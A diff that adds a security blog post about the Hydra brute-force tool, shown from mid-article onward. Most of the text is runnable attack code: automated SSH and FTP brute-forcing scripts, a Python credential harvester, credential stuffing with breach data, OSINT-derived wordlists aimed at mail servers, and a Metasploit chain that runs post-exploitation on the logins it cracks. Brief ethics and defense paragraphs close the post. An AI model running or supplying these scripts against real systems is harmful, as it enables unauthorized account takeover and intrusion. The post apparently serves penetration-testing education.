+    hydra -L $USER_LIST -P $PASS_LIST -t 8 -w 3 -o "$OUTPUT_DIR/ssh_$target.txt" $target ssh
+}
+
+# Function to test FTP
+test_ftp() {
+    local target=$1
+    log_message "Testing FTP on $target"
+    hydra -L $USER_LIST -P $PASS_LIST -t 4 -w 5 -o "$OUTPUT_DIR/ftp_$target.txt" $target ftp
+}
+
+# Main execution
+log_message "Starting automated Hydra scan"
+while IFS= read -r target; do
+    if [[ ! $target =~ ^#.*$ ]] && [[ -n $target ]]; then
+        # Check if SSH is open
+        if nmap -p 22 --open $target | grep -q "22/tcp open"; then
+            test_ssh $target
+        fi
+        
+        # Check if FTP is open
+        if nmap -p 21 --open $target | grep -q "21/tcp open"; then
+            test_ftp $target
+        fi
+        
+        # Wait between targets to avoid overwhelming network
+        sleep 10
+    fi
+done < $TARGET_LIST
+
+log_message "Scan completed. Results in $OUTPUT_DIR"</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Python Integration</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code>#!/usr/bin/env python3
+import subprocess
+import json
+import sys
+from datetime import datetime
+
+class HydraManager:
+    def __init__(self):
+        self.results = []
+        
+    def run_hydra(self, target, service, userlist, passlist, threads=8):
+        """Execute Hydra and parse results"""
+        cmd = [
+            'hydra', '-L', userlist, '-P', passlist, 
+            '-t', str(threads), '-f', '-o', 'temp_results.txt',
+            target, service
+        ]
+        
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
+            return self.parse_results('temp_results.txt')
+        except subprocess.TimeoutExpired:
+            print(f"Hydra timed out for {target}:{service}")
+            return []
+    
+    def parse_results(self, filename):
+        """Parse Hydra output file"""
+        credentials = []
+        try:
+            with open(filename, 'r') as f:
+                for line in f:
+                    if 'login:' in line and 'password:' in line:
+                        # Parse successful credentials
+                        parts = line.strip().split()
+                        # Extract username and password
+                        credentials.append({
+                            'target': parts[2],
+                            'service': parts[3],
+                            'username': parts[4].split(':')[1],
+                            'password': parts[5].split(':')[1],
+                            'timestamp': datetime.now().isoformat()
+                        })
+        except FileNotFoundError:
+            pass
+        return credentials
+    
+    def export_results(self, format_type='json'):
+        """Export results in specified format"""
+        if format_type == 'json':
+            with open('hydra_results.json', 'w') as f:
+                json.dump(self.results, f, indent=2)
+        elif format_type == 'csv':
+            import csv
+            with open('hydra_results.csv', 'w', newline='') as f:
+                if self.results:
+                    writer = csv.DictWriter(f, fieldnames=self.results[0].keys())
+                    writer.writeheader()
+                    writer.writerows(self.results)
+
+# Usage example
+if __name__ == "__main__":
+    manager = HydraManager()
+    targets = ['192.168.1.100', '192.168.1.101']
+    services = ['ssh', 'ftp']
+    
+    for target in targets:
+        for service in services:
+            results = manager.run_hydra(target, service, 'users.txt', 'passwords.txt')
+            manager.results.extend(results)
+    
+    manager.export_results('json')
+    print(f"Found {len(manager.results)} valid credentials")</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Red Team Operations and Advanced Tactics</h2>
+                <p class="mb-4">
+                    In red team operations, Hydra is often used as part of larger attack chains and sophisticated scenarios:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Living Off The Land</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Use system tools to avoid detection
+# Generate wordlists from target information
+curl -s "https://example.com/employees" | grep -oE '\b[A-Za-z]+\.[A-Za-z]+@[A-Za-z]+\.[A-Za-z]+' | cut -d'@' -f1 > users.txt
+
+# Create password variations based on company info
+echo "CompanyName2024" > company_passwords.txt
+echo "CompanyName2023" >> company_passwords.txt
+echo "Company123" >> company_passwords.txt
+
+# Use legitimate traffic patterns
+hydra -L users.txt -P company_passwords.txt -t 2 -w 30 mail.example.com imap</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Credential Stuffing Operations</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Format breach data for Hydra
+# Convert email:password format to separate files
+awk -F: '{print $1}' breach_data.txt > breach_users.txt
+awk -F: '{print $2}' breach_data.txt > breach_passwords.txt
+
+# Test against multiple services with same credentials
+for service in ssh ftp rdp; do
+    hydra -L breach_users.txt -P breach_passwords.txt -t 4 -w 10 192.168.1.100 $service
+done
+
+# Cross-reference successful logins across services
+grep "login:" ssh_results.txt | cut -d' ' -f5 | sort > ssh_valid_users.txt
+grep "login:" ftp_results.txt | cut -d' ' -f5 | sort > ftp_valid_users.txt
+comm -12 ssh_valid_users.txt ftp_valid_users.txt > common_users.txt</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Integration with Other Tools</h2>
+                <p class="mb-4">
+                    Hydra works exceptionally well in combination with other security tools to create comprehensive attack workflows:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Metasploit Integration</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Use Hydra results as input for Metasploit modules
+# Extract successful SSH credentials
+grep "login:" hydra_ssh_results.txt | awk '{print $5":"$6}' > ssh_creds.txt
+
+# Metasploit resource script to use discovered credentials
+cat << 'EOF' > hydra_to_msf.rc
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS file:targets.txt
+set USERNAME file:valid_users.txt
+set PASSWORD file:valid_passwords.txt
+set THREADS 10
+run
+
+# Use successful logins for post-exploitation
+use post/linux/gather/enum_system
+set SESSION 1
+run
+EOF
+
+# Execute in Metasploit
+msfconsole -r hydra_to_msf.rc</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Nmap and Hydra Workflow</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Comprehensive network assessment workflow
+# Step 1: Host discovery
+nmap -sn 192.168.1.0/24 | grep "Nmap scan report" | awk '{print $5}' > live_hosts.txt
+
+# Step 2: Port scanning with service detection
+nmap -sS -sV -p 21,22,23,25,53,80,110,143,443,993,995,3389 -iL live_hosts.txt -oX nmap_results.xml
+
+# Step 3: Extract services for Hydra
+# SSH targets
+xmllint --xpath "//host[ports/port[@portid='22' and state/@state='open']]/address/@addr" nmap_results.xml | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' > ssh_targets.txt
+
+# FTP targets
+xmllint --xpath "//host[ports/port[@portid='21' and state/@state='open']]/address/@addr" nmap_results.xml | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' > ftp_targets.txt
+
+# Step 4: Targeted brute force based on service versions
+# Adjust attack based on detected service versions
+hydra -L default_users.txt -P default_passwords.txt -M ssh_targets.txt ssh
+hydra -L ftp_users.txt -P ftp_passwords.txt -M ftp_targets.txt ftp</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">OSINT and Hydra</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Gather intelligence for targeted attacks
+# Use theHarvester for email enumeration
+theHarvester -d example.com -l 500 -b google | grep "@example.com" | cut -d'@' -f1 > osint_users.txt
+
+# Use cewl for custom wordlist generation from target website
+cewl -w custom_passwords.txt -m 6 -d 2 https://example.com
+
+# Combine OSINT with common password patterns
+# Add company name variations
+sed 's/$/2024/' osint_users.txt >> custom_passwords.txt
+sed 's/$/123/' osint_users.txt >> custom_passwords.txt
+sed 's/$/!/' osint_users.txt >> custom_passwords.txt
+
+# Execute targeted attack
+hydra -L osint_users.txt -P custom_passwords.txt mail.example.com imap</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Enhanced Legal and Ethical Guidelines</h2>
+                <div class="bg-amber-900 bg-opacity-30 border border-amber-500 p-6 rounded-lg mb-8">
+                    <h3 class="text-xl font-semibold mb-3 text-amber-300">📋 Professional Guidelines</h3>
+                    <div class="space-y-4 text-amber-200">
+                        <div>
+                            <h4 class="font-semibold mb-2">Documentation Requirements:</h4>
+                            <ul class="list-disc pl-6 space-y-1">
+                                <li>Maintain detailed logs of all testing activities</li>
+                                <li>Document scope and limitations clearly</li>
+                                <li>Record all successful and failed attempts</li>
+                                <li>Note any potential security issues discovered</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4 class="font-semibold mb-2">Client Communication:</h4>
+                            <ul class="list-disc pl-6 space-y-1">
+                                <li>Provide regular status updates during testing</li>
+                                <li>Report critical findings immediately</li>
+                                <li>Explain potential business impact of discoveries</li>
+                                <li>Offer remediation recommendations</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4 class="font-semibold mb-2">Data Handling:</h4>
+                            <ul class="list-disc pl-6 space-y-1">
+                                <li>Securely store all captured credentials</li>
+                                <li>Delete sensitive data after engagement completion</li>
+                                <li>Follow data protection regulations (GDPR, CCPA, etc.)</li>
+                                <li>Ensure client data confidentiality</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Conclusion</h2>
+                <p class="mb-6">
+                    Hydra is an incredibly powerful tool for testing authentication security across multiple protocols and services. Its versatility, speed, and extensive protocol support make it indispensable for penetration testers and security professionals. However, with great power comes great responsibility – always ensure you have proper authorization before using Hydra in any testing scenario.
+                </p>
+
+                <p class="mb-6">
+                    Remember that the best defense against brute force attacks is implementing strong security practices: complex passwords, account lockout policies, multi-factor authentication, and continuous monitoring. Understanding how tools like Hydra work helps in building more robust security defenses.
+                </p>
+
+                <p class="mb-6">
+                    As you continue your cybersecurity journey, practice with Hydra in controlled environments like your own lab setups or authorized penetration testing scenarios. The knowledge gained will be invaluable for both offensive security testing and defensive security implementation.
+                </p>
+
+                <div class="flex justify-between items-center">
+                    <a href="../posts/index.html" class="text-accent hover:text-secondary transition-colors">&larr; Back to Posts</a>
+                </div>
+            </div>
+        </article>
+    </main>
+
+    <!-- Related Posts -->
+    <section class="container mx-auto px-4 py-12">
+        <div class="max-w-3xl mx-auto">
+            <h2 class="text-2xl font-bold mb-8 bg-gradient-to-r from-accent to-secondary bg-clip-text text-transparent inline-block">Related Posts</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <!-- Related Post 1 -->
+                <div class="bg-gray-800 rounded-xl overflow-hidden hover-card-rise glow-effect border border-gray-700">
+                    <a href="post1.html">
+                        <div class="h-32 bg-gray-700 relative overflow-hidden flex items-center justify-center">
+                            <div class="w-12 h-12 absolute text-gray-600 opacity-30">
+                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                                </svg>
+                            </div>
+                            <div class="absolute top-2 left-2 bg-gradient-to-r from-accent to-secondary text-white text-xs font-medium px-2 py-1 rounded">Cybersecurity</div>
+                        </div>
+                        <div class="p-4">
+                            <div class="flex items-center text-sm text-gray-400 mb-2">
+                                <span>May 11, 2025</span>
+                                <span class="mx-2">•</span>
+                                <span>10 min read</span>
+                            </div>
+                            <h3 class="text-lg font-semibold mb-2 text-white">Mastering Nmap: Essential Commands for Network Scanning</h3>
+                            <p class="text-gray-400 text-sm">A comprehensive guide to using Nmap for effective network reconnaissance...</p>
+                        </div>
+                    </a>
+                </div>
+                
+                <!-- Coming Soon Card -->
+                <div class="bg-gray-800 rounded-xl p-4 glass-effect border border-gray-700">
+                    <h3 class="text-lg font-semibold mb-2 bg-gradient-to-r from-accent to-secondary bg-clip-text text-transparent">More Posts Coming Soon</h3>
+                    <p class="text-gray-300 text-sm">Stay tuned for more cybersecurity articles and tutorials!</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-white py-12 border-t border-gray-800">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="mb-6 md:mb-0">
+                    <div class="flex items-center space-x-2">
+                        <div class="text-2xl font-bold bg-gradient-to-r from-accent to-secondary bg-clip-text text-transparent">r3versein</div>
+                        <span class="text-sm bg-gray-800 px-2 py-1 rounded-md">blog</span>
+                    </div>
+                    <p class="text-gray-400 mt-2">Exploring ideas, sharing knowledge.</p>
+                </div>
+                <div class="flex flex-wrap justify-center md:justify-end gap-6">
+                    <a href="../index.html" class="text-gray-400 hover:text-accent transition-colors relative group">
+                        Home
+                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-accent to-secondary group-hover:w-full transition-all duration-300"></span>
+                    </a>
+                    <a href="../posts/index.html" class="text-gray-400 hover:text-accent transition-colors relative group">
+                        Posts
+                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-accent to-secondary group-hover:w-full transition-all duration-300"></span>
+                    </a>
+                    <a href="../index.html#about" class="text-gray-400 hover:text-accent transition-colors relative group">
+                        About
+                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-accent to-secondary group-hover:w-full transition-all duration-300"></span>
+                    </a>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 mt-8 pt-8 text-center text-gray-400">
+                <p>&copy; 2025 r3versein blog. All rights reserved. Created by Shaswata Roy.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript -->
+    <script src="../js/main.js"></script>
+</body>
+</html>
